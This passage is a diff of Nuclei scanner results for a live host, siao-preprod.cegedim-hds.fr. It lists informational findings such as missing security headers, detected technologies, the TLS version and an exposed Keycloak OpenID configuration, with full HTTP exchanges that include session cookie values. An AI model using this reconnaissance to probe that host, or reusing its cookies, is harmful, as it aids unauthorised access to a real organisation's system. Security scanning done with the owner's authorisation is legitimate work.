+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "access-control-expose-headers",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.470277411Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "permission-policy",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.470717515Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
     "template": "technologies/tech-detect.yaml",
     "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/tech-detect.yaml",
     "template-id": "tech-detect",
@@ -19,49 +427,65 @@
     "host": "https://siao-preprod.cegedim-hds.fr",
     "matched-at": "https://siao-preprod.cegedim-hds.fr",
     "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
-    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' chat.vizir.co code.jquery.com cdn.jsdelivr.net 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample'; object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 24 Apr 2022 04:44:54 GMT\r\nExpires: 0\r\nLast-Modified: Mon, 21 Mar 2022 09:01:32 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=C9CA9A8BC42EACF47F10FB7B61C234F7; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1650775494929; Path=/\r\nSet-Cookie: sessionExpiry=1650777294929; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!sp2Kr/rFKGajoVGsm7p0I5CraKeLePLICRcQCxbKaBYnZ6YQ43eKjqlKNQytOZK23TfxIhddt3kttGzLxec9gZOlXX0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\" data-fr-theme=\"light\">\n  <head>\n    <meta charset=\"utf-8\"/>\n    <base href=\"/\"/>\n    <title>SIAO - 115</title>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n    <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"favicon.ico\"/>\n\n    <link rel=\"dns-prefetch\" href=\"//code.jquery.com\"/>\n\n    <link rel=\"preload\" as=\"font\" type=\"font/woff2\" href=\"./assets/fonts/roboto-v20-latin-regular.woff2\" crossorigin=\"anonymous\"/>\n    <link rel=\"preload\" as=\"font\" type=\"font/woff\" href=\"./assets/fonts/roboto-v20-latin-regular.woff\" crossorigin=\"anonymous\"/>\n\n    <link rel=\"preload\" as=\"font\" type=\"font/woff2\" href=\"./assets/fonts/roboto-v20-latin-italic.woff2\" crossorigin=\"anonymous\"/>\n    <link rel=\"preload\" as=\"font\" type=\"font/woff\" href=\"./assets/fonts/roboto-v20-latin-italic.woff\" crossorigin=\"anonymous\"/>\n\n    <link rel=\"preload\" as=\"font\" type=\"font/woff2\" href=\"./assets/fonts/roboto-v20-latin-700.woff2\" crossorigin=\"anonymous\"/>\n    <link rel=\"preload\" as=\"font\" type=\"font/woff\" href=\"./assets/fonts/roboto-v20-latin-700.woff\" crossorigin=\"anonymous\"/>\n\n    <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n    <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n    <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n    <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n    <script type=\"text/javascript\">\n      var appID = '5e73a199f7cefb002fa1e866';\n      var url = 'https://chat.vizir.co'\n      ! function() {\n        var e, l, t, a, c = document,\n          r = c.getElementById,\n          s = c.createElement,\n          i = c.getElementsByTagName,\n          n = 'n',\n          d = 'https://chat.vizir.co/static/widget/';\n        r.call(c, n) || (l = s.call(c, 'script'), l.id = n, l.src = d + 'new.js', t = i.call(c, 'script')[0], t.parentNode.insertBefore(l, t)), n += '_', r.call(c, n) || (e = s.call(c, 'link'), e.rel = 'stylesheet', e.id = n, e.href = d + 'm.css', a = i.call(c, 'head')[0], a.appendChild(e, a))\n      }();\n    </script>\n\n  <link rel=\"stylesheet\" href=\"legacy-style.09b4ba913bf67c220965.css\"><link rel=\"stylesheet\" href=\"styles.36fc4a4cab997a86eacf.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.54017e0296f125788e08.css\"><link rel=\"stylesheet\" href=\"leaflet-style.30bd1a33a69556cd4280.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n  <body>\n    <siao-app></siao-app>\n  <script src=\"runtime-es2015.5abe80bf2a4e2dd13b37.js\" type=\"module\"></script><script src=\"runtime-es5.5abe80bf2a4e2dd13b37.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.3ba66223d16641376a55.js\" type=\"module\"></script><script src=\"vendor-es5.3ba66223d16641376a55.js\" nomodule defer></script><script src=\"main-es2015.f4f1a1fd4466c8be00dd.js\" type=\"module\"></script><script src=\"main-es5.f4f1a1fd4466c8be00dd.js\" nomodule defer></script></body>\n</html>\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=3F069CE16EEA610E079092477D42B453; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005440; Path=/\r\nSet-Cookie: sessionExpiry=1651382805440; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!Bq1HImIY2GBhtb6sm7p0I5CraKeLeE/VUFoBRiAiC1oZr3zHBE0xZca7SPSto9lgUAtUW6CFisB7w9dWo2pTd1b/HwA=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
     "ip": "185.113.40.47",
-    "timestamp": "2022-04-24T04:44:55.017792703Z",
+    "timestamp": "2022-05-01T04:56:45.585765444Z",
     "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
     "matcher-status": true,
     "matched-line": null
   },
   {
-    "template": "dns/cname-fingerprint.yaml",
-    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/cname-fingerprint.yaml",
-    "template-id": "cname-fingerprint",
+    "template": "ssl/tls-version.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/tls-version.yaml",
+    "template-id": "tls-version",
     "info": {
-      "name": "CNAME Fingerprint",
+      "name": "TLS Version",
       "author": [
         "pdteam"
       ],
       "tags": [
-        "dns",
-        "cname"
+        "ssl"
       ],
-      "description": "A CNAME DNS record was discovered.",
-      "reference": [
-        "https://www.theregister.com/2021/02/24/dns_cname_tracking/",
-        "https://www.ionos.com/digitalguide/hosting/technical-matters/cname-record/"
-      ],
-      "severity": "info",
-      "classification": {
-        "cve-id": null,
-        "cwe-id": [
-          "cwe-200"
-        ],
-        "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
-      }
+      "reference": null,
+      "severity": "info"
     },
-    "type": "dns",
+    "type": "ssl",
     "host": "https://siao-preprod.cegedim-hds.fr",
     "matched-at": "https://siao-preprod.cegedim-hds.fr",
     "extracted-results": [
-      "ip-185-113-40-47.infra.cegedim.org."
+      "TLS12"
     ],
-    "request": ";; opcode: QUERY, status: NOERROR, id: 48501\n;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version 0; flags: ; udp: 4096\n\n;; QUESTION SECTION:\n;siao-preprod.cegedim-hds.fr.\tIN\t NS\n",
-    "response": ";; opcode: QUERY, status: NOERROR, id: 48501\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version 0; flags: ; udp: 1232\n\n;; QUESTION SECTION:\n;siao-preprod.cegedim-hds.fr.\tIN\t NS\n\n;; ANSWER SECTION:\nsiao-preprod.cegedim-hds.fr.\t3600\tIN\tCNAME\tip-185-113-40-47.infra.cegedim.org.\n\n;; AUTHORITY SECTION:\ninfra.cegedim.org.\t3600\tIN\tSOA\tns1.cegedim.fr. hostmaster.cegedim.fr. 2014104553 1200 300 1209600 3600\n",
-    "timestamp": "2022-04-24T04:44:57.643796667Z",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:46.394420973Z",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "exposures/configs/keycloak-openid-config.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/exposures/configs/keycloak-openid-config.yaml",
+    "template-id": "keycloak-openid-config",
+    "info": {
+      "name": "Keycloak openid-config",
+      "author": [
+        "rodnt"
+      ],
+      "tags": [
+        "keycloak",
+        "config"
+      ],
+      "reference": [
+        "https://issues.jboss.org/browse/keycloak-571"
+      ],
+      "severity": "info"
+    },
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr/auth/realms/master/.well-known/openid-configuration",
+    "request": "GET /auth/realms/master/.well-known/openid-configuration HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2794\r\nCache-Control: no-cache, must-revalidate, no-transform, no-store\r\nContent-Type: application/json\r\nDate: Sun, 01 May 2022 04:56:46 GMT\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-TCP8180=!yuZXxCwvSpmp8Eesm7p0I5CraKeLeH/9IeIQOzEtoTUe/JuxLfdGXsvJ9hBCvUP+o/R0ILc0HN6JKMneGy+vPwHc6QY=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nX-Xss-Protection: 1; mode=block\r\n\r\n{\"issuer\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master\",\"authorization_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/auth\",\"token_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token\",\"token_introspection_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token/introspect\",\"userinfo_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/userinfo\",\"end_session_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/logout\",\"jwks_uri\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/certs\",\"check_session_iframe\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/login-status-iframe.html\",\"grant_types_supported\":[\"authorization_code\",\"implicit\",\"refresh_token\",\"password\",\"client_credentials\"],\"response_types_supported\":[\"code\",\"none\",\"id_token\",\"token\",\"id_token token\",\"code id_token\",\"code token\",\"code id_token token\"],\"subject_types_supported\":[\"public\",\"pairwise\"],\"id_token_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\"],\"id_token_encryption_alg_values_supported\":[\"RSA-OAEP\",\"RSA1_5\"],\"id_token_encryption_enc_values_supported\":[\"A128GCM\",\"A128CBC-HS256\"],\"userinfo_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\",\"none\"],\"request_object_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\",\"none\"],\"response_modes_supported\":[\"query\",\"fragment\",\"form_post\"],\"registration_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/clients-registrations/openid-connect\",\"token_endpoint_auth_methods_supported\":[\"private_key_jwt\",\"client_secret_basic\",\"client_secret_post\",\"tls_client_auth\",\"client_secret_jwt\"],\"token_endpoint_auth_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\"],\"claims_supported\":[\"aud\",\"sub\",\"iss\",\"auth_time\",\"name\",\"given_name\",\"family_name\",\"preferred_username\",\"email\",\"acr\"],\"claim_types_supported\":[\"normal\"],\"claims_parameter_supported\":false,\"scopes_supported\":[\"openid\",\"offline_access\",\"profile\",\"email\",\"address\",\"phone\",\"roles\",\"web-origins\",\"microprofil